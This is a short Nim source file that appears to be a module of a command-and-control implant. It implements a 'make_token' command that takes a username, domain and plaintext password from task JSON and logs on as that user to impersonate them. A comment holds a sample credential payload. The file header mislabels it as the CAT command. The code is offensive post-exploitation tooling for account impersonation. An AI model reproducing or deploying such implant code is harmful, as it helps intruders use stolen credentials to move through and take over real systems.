# This is the source for the CAT command
import ../structs
import ../utils
import ../identityManager
import json

#[

Create a new logon token to impersonate a user via username/password

{"credential": {"account": "lowpriv", "comment": "lowpriv", "credential": "2Secure4You!", "realm": ".", "type": "plaintext"}}

]#
proc cmd_make_token*(task: Task): seq[TaskResponse] {.cdecl.} =

  let params = parseJson(task.parameters)
  # unpack the json to obtain the required information
  let cred = params["credential"]
  let username = cred["account"].getStr()
  let domain = cred["realm"].getStr()
  let password = cred["credential"].getStr()

  # Configure Output
  var
    status = ""

  # Do the Magic
  let loginInfo = LoginInformation(username: username, domain: domain)

  if not loginAsUser(loginInfo, password):
    status = "error"

  # return the response
  return buildReturnData(task.id, "", status)

